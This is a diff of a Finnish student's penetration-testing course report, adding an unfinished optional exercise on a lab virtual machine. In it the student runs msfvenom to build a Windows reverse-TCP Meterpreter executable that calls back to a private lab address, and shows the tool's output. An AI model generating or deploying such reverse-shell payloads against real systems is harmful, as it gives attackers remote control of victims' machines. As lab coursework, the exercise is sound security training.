@@ -1,4 +1,4 @@
-## h3 Leviämässä
+## h4 Leviämässä
 
 Tehtävät ovat Tero Karvisen opintojaksolta [Tunkeutumistestaus](https://terokarvinen.com/tunkeutumistestaus/) [^1]
 
@@ -771,7 +771,41 @@ Meterpreter  : aarch64/linux
 meterpreter > 
 ```
 
+---
 
+### h) Vapaaehtoinen: Asenna Windows-virtuaalikone ja tee msfvenomilla ohjelma siihen.
+
+Päätin kokeilla samaa ohjelmaa, mutta nyt exe tiedostotyyppinä.
+
+```
+msfvenom -p windows/aarch64/meterpreter/reverse_tcp LHOST=10.211.55.13 LPORT=4444 -f exe > reversetcp.exe
+```
+
+Ei toiminut:
+
+```bash
+┌──(parallels㉿kali-linux-2024-2)-[~/Documents/Mvenom]
+└─$ msfvenom -p windows/aarch64/meterpreter/reverse_tcp LHOST=10.211.55.13 LPORT=4444 -f exe > reversetcp.exe
+Error: invalid payload: windows/aarch64/meterpreter/reverse_tcp
+```
+
+Pääsin kokeilla ilman aarch64 ja valitsee nyt suoraan x86. Veikkaan että ei toimi, mutta kokeillaan.
+
+```bash
+┌──(parallels㉿kali-linux-2024-2)-[~/Documents/Mvenom]
+└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.13 LPORT=4444 -f exe > reversetcp.exe 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of exe file: 73802 bytes
+```
+
+En tiedä mistä johtuu, mutta Windows ei jostain syystä avaa selaimessa Kalin Apachella tarjoamaa nettisivua.
+
+![img.png](img/h4-leviamassa/img.png)
+
+Valitettavasti aika loppuu kesken ja kokeilu jää seuraavaan kertaan.
 
 ---
 
